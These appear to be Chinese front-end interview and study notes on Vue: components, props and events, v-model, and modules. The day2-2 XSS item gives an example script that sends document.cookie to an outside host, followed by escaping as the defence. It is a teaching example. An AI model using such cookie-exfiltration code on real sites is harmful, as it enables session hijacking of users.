# Vue

## day2-2

### 面试题
* xss攻击，与防御
    * 跨域脚本攻击
    ```js
        ​<img src="xxx" onclick="go()" />
        <h4 style="color:#58bc58">点我有惊喜</h4>
        <script>
            localtion.href="http://www.laoxie.com?data="+document.cookie
        </script>
    ```
    * 防御：
        * 对输入输出进行过滤
        ```html
            ​&lt;img src="xxx" onclick="go()" /&gt;
        ```
* 实例化过程经历什么 new String()
    ```js
        function Mayun(){
            // 1. 创建一个对象
            let obj = {};

            //2. 将this指向obj
            Mayun.bind(obj)

            // 3. 执行内部代码，给obj添加属性
            this.xx1 = 'xx1'
            this.xx2 = 'xx2'
            this.xx3 = 'xx3'

            // 4. 改变原型对象
            obj.__proto__ = Mayun.prototype

            // 5. 返回这个对象
            return obj
        }

        let my = new Mayun();// Mayun()

    ```
* 什么叫轮询
    * 用自己的语言表达出来
* 事件绑定方式，和移除方式
```js
    <button onclick="show()">点我有惊喜</button>

    ele.onclick = show; // ele.onclick = null;
    ele.addEventListener('click',show,false);// ele.removeEventListener('click',show,false)

    function show(){
        
    }
```
* 二次封装
    * 提高开发效率
    * 在封装的基础上再封装
* 防抖与节流
    * 目的为了优化性能
    * 节流：只执行第一次，忽略后面所有操作
        * 滚动加载
    * 防抖：只执行最后一次，忽略前面所有操作
        * 百度搜索建议

### 知识点
* 前端三大框架
    * angular
    * react
    * vue
* 渐进式
    * 核心 -> 配套框架、插件 -> 扩展性
* 安装版本
    * 开发版本  development
        * 完整未压缩：调试、测试，本地开发使用
    * 生产版本  production
        * 压缩合并：删除了警告，上线使用
    * CDN
    * npm / yarn

## day2-3

### 面试题
* Vue双向数据绑定的原理
    * Model -> View : getter&setter
    * View -> Model : 事件

    * v-model 的原理：能用什么操作来替代v-model（单向加+事件）
        * {{}}
        * v-bind
* 实例化对象的执行过程
    1. 创建一个对象 vm->Object.prototype
    2. 改变this指向
    3. 改变原型对象的向 vm->Vue.prototype
    4. 执行构造函数中的代码，给vm添加属性
    5. 返回vm
* http协议与ws协议的区别
    * socket心跳

* nodejs版本
    * 多版本共存nvm
        * 安装node: nvm install xxx
        * 切换node: nvm use xxx
* 乱码的根源
    * 编码不一致
* 自适应布局问题
    * flex
    * 定位
* gulp的方法
    * gulp.task()
    * gulp.src()
    * gulp.dest()
    * gulp.watch()

### 复习
* 属性特性
    > 传统方式定义属性，属性特性默认为true，通过Object.defineProperty定义的属性，属性特性默认为false
    * 值属性
        * configurable
        * enumerable
        * writable
        * value
    * 存储器属性
        * configurable
        * enumerable
        * get
        * set

        obj = {
            a:10,
            b:function(){

            },
            get c(){
                return this.a;
            },
            set c(val){
                this.a = val
                // 为所欲为
            }
        }

        obj.b()
        obj.c ;//10
        obj.c = 100
* Vue
    * 指令
        * v-on      @
        * v-bind    :
            * 属性
                * class
                * style
        * v-model
        * v-if/v-else-if/v-else
        * v-for
            * in
            * of
        * v-show
        * 
    * 实例化配置参数
    * 响应式属性
        * 初始化data
        * Vue.set(target,key,val) / vm.$set(target,key,val)
            * target不可以是vm实例和data属性
        * 数组变异方法
    * 架构模式
        * MVC
        * MVP
        * MVVM
    * 思维的转变
        * 关注节点操作 -> 关注数据

### 知识点
* Vue实例化过程
    * 这里定义的data为值属性
    但在实例化后，Vue会通过Object.defineProperty()把他们变成存储器属性（getter&setter）
    并写入vm实例（意味着可以在代码中通过this访问到这些属性）
* 模块化（组件化）
* 组件
    > 组件就是一个Vue实例
    * 全局组件
        * 定义：Vue.component(name,options)
            * name：组件名称
            * options:组件配置参数
    * 局部组件
        * components
* 组件通讯
    * 数据流（数据流向：上->下，单向数据流）
    * 父->子：props
        1. 定义属性
        2. 接收属性

## day2-4

### 面试题
* Vue的数据绑定有哪几种
    * 内容
        * {{}}
        * v-text
        * v-html
        * v-model
    * 属性
        * v-bind
* Vue组件的data属性为什么必须为函数
    * 复用
* v-model的原理
    * Model -> View：v-bind:value="xxx"      getter&setter
    * View -> Model：v-on:input="xxx"        事件
* Vue如何定义组件
    * 全局组件与局部组件的区别
* 懒加载与预加载的区别
    * 懒加载：被动
    * 预加载：主动
* 改变this指向的方式
    * 箭头函数没有this
* Vue的方法中为什么能通过this.xxx访问
    * 实例化过程会把data,computed,methods,props等属性写入实例


### 复习
* 实例属性/方法
* 配置参数
* 组件
    > 模块化开发，一个组件就是一个Vue的实例
    * 为什么要使用组件化开发
        * 复用
        * 维护与版本迭代更容易
    * 定义：定义一个组件其实就是自定义一个标签
        * 全局：Vue.component(name,option)
        * 局部：components
        * 规定
            * 无el属性
            * data属性必须为函数
            * 只允许有一个根节点
            * 组件名必须为小写（w3c）
    * 组件通讯
        * 父->子：props
            1. 父组件：定义属性
            2. 子组件：接收属性
       

### 知识点
* npm script （npm脚本命令）
* VueCLI： 
    * 基于Vue+Webpack+babel
    * 热更新
* vue的单文件组件
    * 后缀：.vue
    * 实现把html、css、js组合在一个后缀为.vue的文件中
* ES Module
    > 模块对象，只能在服务器环境下使用
    * import
    * export

* 组件通讯
    * 父->子：props
        1. 父组件：定义属性
        2. 子组件：接收属性
     * 子->父：
        1. 父组件：自定义事件
            * v-on:xxx="事件处理函数"
        2. 子组件：触发自定义事件
            * this.$emit('xxx',数据)
        * 简单数据
            1. 父组件：v-bind:xxx.sync="num"  === v-on:update:xxx="(val)=>{num=val}"
            2. 子组件：this.$emit('update:xxx','数据')
    * 兄弟->兄弟：
        1. 兄弟->父
        2. 父->兄弟
    * 深层组件传输
        * Bus总线
        * Vuex

## day2-5

### 面试题
* 怎么判断对象象中包含某个属性
```js
    let obj = {
        //..
        // __proto__:{
        //     a:10
        // }
    }

    // 判断是否有属性a
    if(obj.a !== undefined){

    }
```

### 复习
* 组件
    * 什么是组件
        * 是一个模块
    * 为什么需要组件化开发
        * 复用
        * 方便后期的维护
    * 开发前的准备工作
        * 给页面划分组件
    * 定义
        * 全局
        * 局部
    * 单文件组件
        * html
        * js
        * css
    * 模块化开发
        * AMD           require.js
        * CMD           sea.js
        * CommonJS      nodejs
            * 导出：module.exports
            * 导入：require()
        * ESModule
            > 模块对象  
            * 导出：export
                * var,let,const function class
                * {},default
            * 导入：import
                * as
                * `*`
    * 组件通讯
        * 父->子：props
            1. 父组件：定义属性
            2. 子组件：props接收
        * 子->父：
            * 常规方法
                1. 父组件：自定义事件v-on
                    * 如何在父组件定义子组件的自定义事件
                        * 在子组件上用v-on指令
                        * 获取子组件实例：ref -> $on()
                2. 子组件：触发自定义事件this.$emit
            * 简单数据
                * 父组件：v-bind:changenum.sync="num"
                * 子组件：this.$emit('update:changenum',100)
        * 兄弟->兄弟
        * 深层次/无关联组件通讯
            * Bus
                * 接收方：自定义事件
                * 传输方：触发自定义事件

            
### 知识点
* 数据类型校验
    * props父传子
        * required  必填
        * default   默认值
            > 引用数据类型默认值必须为一个函数，并return一个值